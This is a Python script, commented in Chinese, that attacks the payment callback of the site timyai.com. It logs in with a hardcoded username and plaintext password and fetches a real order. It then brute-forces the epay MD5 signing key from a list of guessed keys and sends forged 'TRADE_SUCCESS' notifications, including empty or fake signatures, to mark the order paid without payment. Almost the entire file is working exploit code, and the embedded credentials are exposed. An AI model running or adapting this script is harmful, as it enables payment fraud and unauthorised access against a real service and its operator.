#!/usr/bin/env python3
import requests
import json
import hashlib
import time
from urllib.parse import urlencode

BASE_URL = "https://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"
REAL_TRADE_NO = "USR20NO5FFXID1777806504"

def print_header(title):
    print(f"\n{'='*60}")
    print(f"{title}")
    print('='*60)

def test_login():
    print_header("步骤1: 登录获取认证")
    
    data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
    
    try:
        url = BASE_URL + "/api/user/login"
        resp = requests.post(url, json=data, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            user_id = result.get("data", {}).get("id")
            session = resp.cookies.get("session")
            print(f"✅ 登录成功 - 用户ID: {user_id}")
            return user_id, session
        else:
            print(f"❌ 登录失败")
            return None, None
    except Exception as e:
        print(f"❌ 请求失败: {e}")
        return None, None

def analyze_order_and_get_signature(user_id, session):
    print_header("步骤2: 分析订单和原始签名")
    
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id), "Content-Type": "application/json"}
    
    try:
        url = BASE_URL + "/api/user/topup/self"
        resp = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            items = result.get("data", {}).get("items", [])
            
            target_order = None
            for item in items:
                if item.get('trade_no') == REAL_TRADE_NO:
                    target_order = item
                    break
            
            if not target_order:
                print(f"❌ 未找到订单: {REAL_TRADE_NO}")
                return None, None
            
            print(f"\n订单信息:")
            print(f"  订单号: {target_order.get('trade_no')}")
            print(f"  金额: {target_order.get('money')}元")
            print(f"  充值额度: {target_order.get('amount')}")
            print(f"  支付方式: {target_order.get('payment_method')}")
            print(f"  状态: {target_order.get('status')}")
            
            callback_params = {
                "pid": "1378",
                "out_trade_no": target_order.get('trade_no'),
                "trade_status": "TRADE_SUCCESS",
                "trade_fee": str(target_order.get('money')),
                "type": target_order.get('payment_method'),
                "time": str(target_order.get('create_time')),
            }
            
            return callback_params, target_order
            
    except Exception as e:
        print(f"❌ 请求异常: {e}")
        return None, None

def generate_epay_signature(params, key):
    """生成易支付MD5签名"""
    sorted_params = sorted([(k, v) for k, v in params.items() if k != 'sign'])
    sign_str = "&".join([f"{k}={v}" for k, v in sorted_params])
    sign_str += f"&key={key}"
    print(f"\n签名源字符串: {sign_str}")
    signature = hashlib.md5(sign_str.encode()).hexdigest()
    return signature

def try_brute_force_signature(params):
    print_header("步骤3: 尝试破解签名")
    
    base_params = {k: v for k, v in params.items() if k != 'sign'}
    
    common_keys = [
        "test",
        "123456",
        "abcdef",
        "epay",
        "timyai",
        "123456789",
        "password",
        "admin",
        "key",
        "secret",
        "1378",
        "2026",
        "zhunfu",
    ]
    
    test_keys = []
    for k in common_keys:
        test_keys.append(k)
        test_keys.append(k + "key")
        test_keys.append(k + "_key")
        test_keys.append(k + ".key")
    
    for i in range(100):
        test_keys.append(str(i))
        test_keys.append(f"key{i}")
    
    print(f"\n尝试 {len(test_keys)} 个常见密钥...")
    
    found_key = None
    for key in test_keys:
        sign = generate_epay_signature(base_params, key)
        
        test_callback = base_params.copy()
        test_callback['sign'] = sign
        
        url = BASE_URL + "/api/user/epay/notify"
        resp = requests.post(url, data=test_callback, timeout=10)
        
        if resp.text == "success":
            print(f"\n✅ 找到有效密钥: {key}")
            print(f"   签名: {sign}")
            found_key = key
            break
    
    if not found_key:
        print(f"\n❌ 未找到有效密钥")
        print(f"   可能原因:")
        print(f"   - 密钥不在常见密钥列表中")
        print(f"   - 签名算法不是标准MD5")
        print(f"   - 需要更多参数参与签名")
    
    return found_key

def analyze_original_signature(params):
    print_header("步骤4: 分析原始签名格式")
    
    base_params = {k: v for k, v in params.items() if k != 'sign'}
    
    print(f"\n参数列表:")
    for k, v in sorted(base_params.items()):
        print(f"  {k} = {v}")
    
    algorithms_to_try = [
        ("标准MD5", lambda s: hashlib.md5(s.encode()).hexdigest()),
        ("MD5大写", lambda s: hashlib.md5(s.encode()).hexdigest().upper()),
        ("SHA1", lambda s: hashlib.sha1(s.encode()).hexdigest()),
        ("SHA256", lambda s: hashlib.sha256(s.encode()).hexdigest()),
    ]
    
    sign_formats = [
        "key1=value1&key2=value2&key={key}",
        "key={key}&key1=value1&key2=value2",
        "key1=value1&key2=value2",
    ]
    
    print(f"\n尝试不同的签名格式...")

def test_with_various_signatures(trade_no, base_params):
    print_header("步骤5: 测试不同签名策略")
    
    url = BASE_URL + "/api/user/epay/notify"
    
    strategies = [
        ("空签名为success", {"sign": ""}),
        ("无sign参数", {}),
        ("sign=success", {"sign": "success"}),
        ("sign=1", {"sign": "1"}),
        ("sign=true", {"sign": "true"}),
        ("sign=TRADE_SUCCESS", {"sign": "TRADE_SUCCESS"}),
        ("trade_status=success", {"trade_status": "success"}),
        ("trade_status=TRADE_FINISHED", {"trade_status": "TRADE_FINISHED"}),
    ]
    
    print(f"\n测试 {len(strategies)} 种签名策略...")
    
    for desc, override in strategies:
        test_params = base_params.copy()
        test_params.update(override)
        
        try:
            resp = requests.post(url, data=test_params, timeout=10)
            status = "✅" if resp.text != "success" else "⚠️"
            print(f"\n{status} {desc}: {resp.text[:30]}")
            
            if resp.text == "success":
                print(f"  ⚠️  ⚠️  ⚠️  可能存在漏洞! ⚠️  ⚠️  ⚠️")
                return True
        except Exception as e:
            print(f"  ❌ 异常: {e}")
    
    return False

def verify_order_status(user_id, session, trade_no):
    print_header("步骤6: 验证订单状态")
    
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id), "Content-Type": "application/json"}
    
    try:
        url = BASE_URL + "/api/user/topup/self"
        resp = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            items = result.get("data", {}).get("items", [])
            
            for item in items:
                if item.get('trade_no') == trade_no:
                    print(f"\n订单状态:")
                    print(f"  订单号: {item.get('trade_no')}")
                    print(f"  金额: {item.get('money')}元")
                    print(f"  状态: {item.get('status')}")
                    return item.get('status')
        
        return None
        
    except Exception as e:
        print(f"❌ 请求异常: {e}")
        return None

def main():
    print_header("timyai.com 签名破解测试")
    
    user_id, session = test_login()
    
    if not user_id or not session:
        print("\n❌ 登录失败")
        return
    
    result = analyze_order_and_get_signature(user_id, session)
    if not result:
        print("\n❌ 获取订单失败")
        return
    
    base_params, order = result
    
    analyze_original_signature(base_params)
    
    found_key = try_brute_force_signature(base_params)
    
    if found_key:
        print(f"\n✅ 成功破解密钥!")
    else:
        print(f"\n尝试其他签名策略...")
        test_with_various_signatures(REAL_TRADE_NO, base_params)
    
    verify_order_status(user_id, session, REAL_TRADE_NO)
    
    print_header("测试完成")

if __name__ == "__main__":
    main()
